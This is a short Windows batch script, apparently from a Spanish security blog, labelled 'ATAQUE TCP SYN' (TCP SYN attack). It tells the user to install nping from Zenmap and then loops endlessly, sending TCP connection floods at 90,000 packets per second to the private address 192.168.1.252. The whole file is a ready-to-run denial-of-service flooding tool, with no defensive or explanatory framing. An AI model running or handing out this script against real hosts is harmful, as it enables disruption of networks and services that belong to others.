@ECHO OFF
ECHO ATAQUE TCP SYN (c) hackingyseguridad 2016. Version 2.
ECHO Requiere tener instalado en el PC, nping incluido en Zenmap https://nmap.org/download.html
:loop
nping --tcp-connect -rate=90000 -c 900000 -q 192.168.1.252
goto loop